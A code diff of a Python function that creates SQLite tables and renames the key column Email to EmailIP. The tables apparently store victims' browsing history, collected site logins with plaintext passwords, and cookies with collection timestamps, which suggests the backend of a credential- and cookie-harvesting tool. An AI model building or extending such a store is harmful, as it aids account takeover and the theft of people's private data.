@@ -6,57 +6,57 @@ def create_all_tables():
     
     #### Crease Users Table ####
     q = """CREATE TABLE IF NOT EXISTS Users (
-    Email VARCHAR(255),
+    EmailIP VARCHAR(255),
     LastOnline DATETIME,
-    PRIMARY KEY (Email)
+    PRIMARY KEY (EmailIP)
     );"""
     c.execute(q)
 
     #### Crease History Table ####
     q = """CREATE TABLE IF NOT EXISTS History (
-    Email VARCHAR(255),
+    EmailIP VARCHAR(255),
     Url TEXT UNIQUE,
     LastVisited DATETIME,
-    FOREIGN KEY (Email) REFERENCES Users(Email)
+    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
     );"""
     c.execute(q)
 
     #### Crease Login Table ####
     q = """CREATE TABLE IF NOT EXISTS Login (
-    Email VARCHAR(255),
+    EmailIP VARCHAR(255),
     Url TEXT UNIQUE,
     Username VARCHAR(255),
     Password TEXT,
     TimeCollected DATETIME,
-    FOREIGN KEY (Email) REFERENCES Users(Email)
+    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
     );"""
     c.execute(q)
 
     #### Creat Cookies Table ####
     q = """CREATE TABLE IF NOT EXISTS Cookies (
-    Email VARCHAR(255),
+    EmailIP VARCHAR(255),
     Url TEXT,
     CookieKey TEXT,
     CookieVal TEXT,
     TimeCollected DATETIME,
-    FOREIGN KEY (Email) REFERENCES Users(Email),
-    PRIMARY KEY (Email, Url, CookieKey)
+    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP),
+    PRIMARY KEY (EmailIP, Url, CookieKey)
     );"""
     c.execute(q)
 
     #### Create Secure Table ####
     q = """CREATE TABLE IF NOT EXISTS Secure (
-    Email VARCHAR(255),
+    EmailIP VARCHAR(255),
     Url TEXT,
-    FOREIGN KEY (Email) REFERENCES Users(Email)
+    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
     );"""
     c.execute(q)
 
     #### Create Random Table ####
     q = """CREATE TABLE IF NOT EXISTS Random (
-    Email VARCHAR(255),
+    EmailIP VARCHAR(255),
     Url TEXT,
-    FOREIGN KEY (Email) REFERENCES Users(Email)
+    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
     );"""
     c.execute(q)
 
